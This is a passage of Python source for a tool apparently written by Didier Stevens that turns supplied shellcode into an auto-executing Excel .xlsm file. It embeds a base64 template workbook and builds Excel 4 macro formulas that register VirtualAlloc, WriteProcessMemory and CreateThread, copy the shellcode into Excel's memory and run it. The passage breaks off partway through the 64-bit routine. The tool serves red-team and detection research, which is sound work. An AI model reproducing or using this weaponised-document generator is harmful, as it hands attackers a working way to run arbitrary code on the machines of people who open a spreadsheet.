#!/usr/bin/env python

__description__ = 'Generate Excel 4 macros for shellcode (without a select loop)'
__author__ = 'Didier Stevens'
__version__ = '0.0.1'
__date__ = '2021/01/19'

"""

Source code put in public domain by Didier Stevens, no Copyright
https://DidierStevens.com
Use at your own risk

History:
  2021/01/18: start
  2021/01/19: added option verbose

Todo:

"""

import optparse
import sys
import textwrap
import zipfile
import binascii
from io import BytesIO
import xml.sax.saxutils

def PrintManual():
    manual = '''
Manual:

This tool takes a file with shellcode as input, and creates an xlsm file with Excel 4 macros (that will auto-execute) to write the shellcode into Excel's memory and then execute.
The shellcode may contain NULL bytes.
The first argument (32 or 64) specifies 32-bit or 64-bit shellcode respectively.

Option -t can be used to provide your own template .xlsm file. It must contain a macro sheet with a first row (that will be replaced).

'''
    for line in manual.split('\n'):
        print(textwrap.fill(line, 78))

# CIC: Call If Callable
def CIC(expression):
    if callable(expression):
        return expression()
    else:
        return expression

# IFF: IF Function
def IFF(expression, valueTrue, valueFalse):
    if expression:
        return CIC(valueTrue)
    else:
        return CIC(valueFalse)

#D:\MyDirsD\Develop\Python\excel4macros\open-write-close-execute.xlsm 7590c44ae6b3c6136be4c7a23206ca07
zipTemplateFile = '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'

def IsMacroSheet(sheetname):
    return sheetname.split('/')[:-1] == ['xl', 'macrosheets']

def CreateRowElement(rowNumber, formula):
    return b'<row r="%d" x14ac:dyDescent="0.25"><c r="A%d"><f>%s</f><v>0</v></c></row>' % (rowNumber, rowNumber, formula)

def XMLEscape(data):
    if isinstance(data, str):
        return xml.sax.saxutils.escape(data)
    else:
        return xml.sax.saxutils.escape(data.decode()).encode()

def SequencePayload(payload):
    sequence = []
    stringable = b''
    notstringable = []
    nullbytes = []
    for byte in payload + b'\x00':
        if byte == 0x00:
            if notstringable != []:
                sequence.append(notstringable)
                notstringable = []
            if stringable != b'':
                sequence.append(stringable)
                stringable = b''
            nullbytes.append(byte)
        elif byte >= 0x20 and byte < 0x22 or byte > 0x22 and byte < 0x7F:
            if nullbytes != []:
                sequence.append(len(nullbytes))
                nullbytes = []
            if notstringable != []:
                sequence.append(notstringable)
                notstringable = []
            stringable += bytes([byte])
        else:
            if nullbytes != []:
                sequence.append(len(nullbytes))
                nullbytes = []
            if stringable != b'':
                sequence.append(stringable)
                stringable = b''
            notstringable.append(byte)
    if len(nullbytes) > 1:
        sequence.append(len(nullbytes) - 1)
    return sequence

def SplitSequence(sequence, maxBytes, maxInts):
    result = []
    for item in sequence:
        if isinstance(item, bytes):
            result.extend([item[i:i+maxBytes] for i in range(0, len(item), maxBytes)])
        elif isinstance(item, int):
            result.append(item)
        else:
            result.extend([item[i:i+maxInts] for i in range(0, len(item), maxInts)])
    return result

def GenerateRowsMacroCode32(shellcodeSequence):
    excel4macrosFor32BitShellcodeBegin = [
        b'REGISTER("Kernel32","VirtualAlloc","JJJJJ","VirtualAlloc",,1,9)',
        b'REGISTER("Kernel32","WriteProcessMemory","JJJCJJ","WriteProcessMemory",,1,9)',
        b'REGISTER("Kernel32","CreateThread","JJJJJJJ","CreateThread",,1,9)',
        b'SET.VALUE(B1,VirtualAlloc(0,65536,4096,64))',
    ]

    excel4macrosFor32BitShellcodeEnd = [
        b'CreateThread(0,0,B1,0,0,0)',
        b'HALT()',
    ]

    position = 0
    formulas = excel4macrosFor32BitShellcodeBegin
    for item in shellcodeSequence:
        if isinstance(item, bytes):
            formulas.append(b'WriteProcessMemory(-1,B1+%d,"%s",%d,0)' % (position, XMLEscape(item), len(item)))
            position += len(item)
        elif isinstance(item, int):
            position += item
        else:
            formulas.append(b'WriteProcessMemory(-1,B1+%d,%s,%d,0)' % (position, XMLEscape(b'&'.join([b'CHAR(%d)' % integer for integer in item])), len(item)))
            position += len(item)
    formulas.extend(excel4macrosFor32BitShellcodeEnd)

    return formulas

def GenerateRowsMacroCode64(shellcodeSequence):
    excel4macrosFor64BitShellcodeBegin = [
        b'SET.VALUE(B1,0)',
        b'SET.VALUE(B2,HEX2DEC("50000000"))',
        b'REGISTER("Kernel32","VirtualAlloc","JJJJJ","VirtualAlloc",,1,9)',
        b'WHILE(B1=0)',
        b'SET.VALUE(B1,VirtualAlloc(B2,65536,12288,64))',
        b'SET.VALUE(B2,B2+HEX2DEC("40000"))',
        b'NEXT()',
        b'REGISTER("Kernel32","RtlCopyMemory","JJCJ","RTL",,1,9)',
